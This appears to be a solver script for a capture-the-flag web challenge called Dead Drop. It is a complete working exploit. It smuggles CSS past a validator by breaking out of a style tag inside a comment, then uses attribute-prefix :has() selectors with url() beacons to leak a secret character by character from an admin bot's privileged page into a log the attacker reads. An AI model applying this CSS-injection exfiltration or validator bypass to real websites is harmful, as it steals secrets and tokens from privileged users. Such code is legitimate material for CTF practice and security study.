#!/usr/bin/env python3
"""Exploit Dead Drop's courier-only DOM through the private pickup log.

The injected CSS turns an attribute-prefix match in the courier's privileged
render into a same-origin request to an attacker-owned collector drop.  No
external callback service is required.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import time
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

import requests


ROOT = Path(__file__).resolve().parent
FLAG_PREFIX = "BHFlagY{"
FLAG_RE = re.compile(r"BHFlagY\{[0-9a-f]+\}\Z")
FLAG_ALPHABET = "0123456789abcdef}"
ATTRIBUTE_CANDIDATES = (
    "value",
    "data-flag",
    "data-secret",
    "data-token",
    "data-manifest",
    "data-internal",
    "data-handling",
    "data-key",
    "data-code",
    "data-note",
    "data-value",
    "content",
    "title",
    "aria-label",
    "id",
    "class",
    "style",
    "href",
    "src",
    "action",
)


class ExploitError(RuntimeError):
    pass


def css_string(value: str) -> str:
    return value.replace("\\", "\\\\").replace('"', '\\"')


def marker_in(value: Any, marker: str) -> bool:
    if isinstance(value, str):
        return marker in value
    if isinstance(value, dict):
        return any(marker_in(item, marker) for item in value.values())
    if isinstance(value, list):
        return any(marker_in(item, marker) for item in value)
    return False


class DeadDrop:
    def __init__(self, base_url: str, timeout: float) -> None:
        self.base_url = base_url.rstrip("/") + "/"
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Dead-Drop-solver/1.0"
        self.session.headers["Connection"] = "close"

    def request(self, method: str, path: str, **kwargs: Any) -> requests.Response:
        url = urljoin(self.base_url, path.lstrip("/"))
        kwargs.setdefault("timeout", self.timeout)
        attempts = 4 if method.upper() == "GET" else 3
        last_error: requests.RequestException | None = None
        for attempt in range(attempts):
            try:
                response = self.session.request(method, url, **kwargs)
            except requests.RequestException as exc:
                last_error = exc
                if attempt + 1 < attempts:
                    time.sleep(0.75)
                    continue
                break
            if (
                method.upper() == "GET"
                and response.status_code in (502, 503, 504)
                and attempt + 1 < attempts
            ):
                time.sleep(0.75)
                continue
            return response
        raise ExploitError(f"request failed: {method} {url}: {last_error}")

    def assert_live(self) -> None:
        response = self.request("GET", "/")
        if response.status_code != 200 or "POSTE RESTANTE" not in response.text:
            raise ExploitError(
                f"challenge is not live: GET / returned HTTP {response.status_code}"
            )

    def create_drop(self, title: str, css: str = "", body: str = "probe") -> int:
        response = self.request(
            "POST",
            "/post",
            data={"title": title, "body": body, "css": css},
            allow_redirects=False,
        )
        location = response.headers.get("Location", "")
        match = re.fullmatch(r"/post/(\d+)", location)
        if response.status_code not in (302, 303) or not match:
            detail = response.text.strip().replace("\n", " ")[:300]
            raise ExploitError(
                f"drop creation failed: HTTP {response.status_code}, "
                f"Location={location!r}, body={detail!r}"
            )
        return int(match.group(1))

    def report(self, post_id: int) -> None:
        response = self.request("POST", "/report", data={"id": str(post_id)})
        if response.status_code != 200 or "queued" not in response.text.lower():
            raise ExploitError(
                f"courier report failed for post {post_id}: HTTP {response.status_code}"
            )

    def views(self, collector_id: int) -> list[Any]:
        response = self.request("GET", f"/post/{collector_id}/views")
        if response.status_code != 200:
            raise ExploitError(
                f"pickup log failed for post {collector_id}: HTTP {response.status_code}"
            )
        try:
            value = response.json()
        except requests.JSONDecodeError as exc:
            raise ExploitError("pickup log did not return JSON") from exc
        if not isinstance(value, list):
            raise ExploitError(f"unexpected pickup log shape: {type(value).__name__}")
        return value

    def verify_collector(self, collector_id: int) -> dict[str, Any]:
        marker = f"health_{int(time.time() * 1000)}"
        response = self.request("GET", f"/px/{collector_id}?m={marker}")
        if response.status_code != 200:
            raise ExploitError(
                f"collector beacon failed: HTTP {response.status_code}"
            )
        events = self.views(collector_id)
        if not marker_in(events, marker):
            raise ExploitError(
                "pickup log does not preserve beacon query markers; "
                f"observed events: {json.dumps(events, ensure_ascii=False)}"
            )
        return {"health_marker": marker, "sample_events": events}

    def wait_for_any_marker(
        self,
        collector_id: int,
        markers: set[str],
        baseline: list[Any],
        wait_seconds: float,
    ) -> tuple[str | None, list[Any]]:
        deadline = time.monotonic() + wait_seconds
        latest = baseline
        while time.monotonic() < deadline:
            latest = self.views(collector_id)
            for marker in markers:
                if marker_in(latest, marker):
                    return marker, latest
            time.sleep(0.75)
        return None, latest


def layered_background(variable_names: list[str]) -> str:
    layers = ",".join(f"var(--{name},none)" for name in variable_names)
    return f"body{{background-image:{layers}!important}}"


def style_comment_breakout(inner_css: str) -> str:
    """Hide active CSS in a validator comment while breaking the HTML style tag."""
    return f"/*</style><style>{inner_css}</style><style>*/"


def discovery_css(collector_id: int) -> tuple[str, dict[str, str]]:
    marker_to_attribute: dict[str, str] = {}
    rules: list[str] = []
    variables: list[str] = []
    for index, attribute in enumerate(ATTRIBUTE_CANDIDATES):
        marker = f"discover_{index:02d}"
        variable = f"dd{index:02d}"
        marker_to_attribute[marker] = attribute
        variables.append(variable)
        rules.append(
            f'body:has([{attribute}*="{css_string(FLAG_PREFIX)}"])'
            f'{{--{variable}:url("/px/{collector_id}?m={marker}")}}'
        )
    rules.append(layered_background(variables))
    return "".join(rules), marker_to_attribute


def prefix_css(
    collector_id: int, attribute: str, known: str, position: int
) -> tuple[str, dict[str, str]]:
    marker_to_character: dict[str, str] = {}
    rules: list[str] = []
    variables: list[str] = []
    for index, character in enumerate(FLAG_ALPHABET):
        marker = f"pos_{position:02d}_{ord(character):02x}"
        variable = f"pc{index:02d}"
        marker_to_character[marker] = character
        variables.append(variable)
        candidate = css_string(known + character)
        rules.append(
            f'body:has([{attribute}^="{candidate}"])'
            f'{{--{variable}:url("/px/{collector_id}?m={marker}")}}'
        )
    rules.append(layered_background(variables))
    return "".join(rules), marker_to_character


def run_probe(
    app: DeadDrop,
    collector_id: int,
    title: str,
    css: str,
    markers: set[str],
    wait_seconds: float,
) -> tuple[str, int, list[Any]]:
    baseline = app.views(collector_id)
    post_id = app.create_drop(title=title, css=style_comment_breakout(css))
    app.report(post_id)
    marker, events = app.wait_for_any_marker(
        collector_id, markers, baseline, wait_seconds
    )
    if marker is None:
        # A single retry distinguishes a dropped queue job from a stable selector miss.
        app.report(post_id)
        marker, events = app.wait_for_any_marker(
            collector_id, markers, baseline, wait_seconds
        )
    if marker is None:
        raise ExploitError(
            f"courier produced no matching marker for post {post_id}; "
            "the bot may be unavailable or the DOM hypothesis may be wrong"
        )
    return marker, post_id, events


def parse_args() -> argparse.Namespace:
    instance = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in instance["endpoints"] if item["name"] == "main")
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default=endpoint["url"], help="challenge base URL")
    parser.add_argument("--timeout", type=float, default=15.0)
    parser.add_argument("--wait", type=float, default=20.0, help="seconds per bot visit")
    parser.add_argument("--max-length", type=int, default=80)
    parser.add_argument(
        "--prefix",
        default=FLAG_PREFIX,
        help="verified flag prefix from which to resume",
    )
    parser.add_argument(
        "--attribute",
        choices=ATTRIBUTE_CANDIDATES,
        help="skip attribute discovery and use this flag-bearing attribute",
    )
    parser.add_argument(
        "--evidence",
        type=Path,
        default=ROOT / "output" / "last-run.json",
        help="sanitized evidence output path",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if not re.fullmatch(r"BHFlagY\{[0-9a-f]*", args.prefix):
        print(f"[-] invalid resume prefix: {args.prefix!r}", file=sys.stderr)
        return 2
    app = DeadDrop(args.url, args.timeout)
    recovered = args.prefix
    evidence: dict[str, Any] = {
        "target": args.url,
        "flag_prefix": FLAG_PREFIX,
        "starting_prefix": args.prefix,
        "collector_id": None,
        "attribute": None,
        "probe_post_ids": [],
        "recovered_prefixes": [],
    }
    try:
        app.assert_live()
        collector_id = app.create_drop("pickup-log-collector")
        evidence["collector_id"] = collector_id
        evidence["collector_check"] = app.verify_collector(collector_id)

        attribute = args.attribute
        if attribute is None:
            css, marker_map = discovery_css(collector_id)
            marker, post_id, _ = run_probe(
                app,
                collector_id,
                "attribute-discovery",
                css,
                set(marker_map),
                args.wait,
            )
            evidence["probe_post_ids"].append(post_id)
            attribute = marker_map[marker]
        evidence["attribute"] = attribute

        while not recovered.endswith("}") and len(recovered) < args.max_length:
            position = len(recovered)
            css, marker_map = prefix_css(
                collector_id, attribute, recovered, position
            )
            marker, post_id, _ = run_probe(
                app,
                collector_id,
                f"prefix-{position:02d}",
                css,
                set(marker_map),
                args.wait,
            )
            evidence["probe_post_ids"].append(post_id)
            recovered += marker_map[marker]
            evidence["recovered_prefixes"].append(recovered)
            evidence["last_prefix"] = recovered
            args.evidence.parent.mkdir(parents=True, exist_ok=True)
            args.evidence.write_text(
                json.dumps(evidence, indent=2, ensure_ascii=False) + "\n",
                encoding="utf-8",
            )

        if not FLAG_RE.fullmatch(recovered):
            raise ExploitError(f"recovered value failed flag validation: {recovered!r}")
        evidence["flag"] = recovered
        args.evidence.parent.mkdir(parents=True, exist_ok=True)
        args.evidence.write_text(
            json.dumps(evidence, indent=2, ensure_ascii=False) + "\n",
            encoding="utf-8",
        )
        sys.stdout.buffer.write(recovered.encode("ascii"))
        return 0
    except ExploitError as exc:
        evidence["last_prefix"] = recovered
        evidence["error"] = str(exc)
        args.evidence.parent.mkdir(parents=True, exist_ok=True)
        args.evidence.write_text(
            json.dumps(evidence, indent=2, ensure_ascii=False) + "\n",
            encoding="utf-8",
        )
        print(f"[-] {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
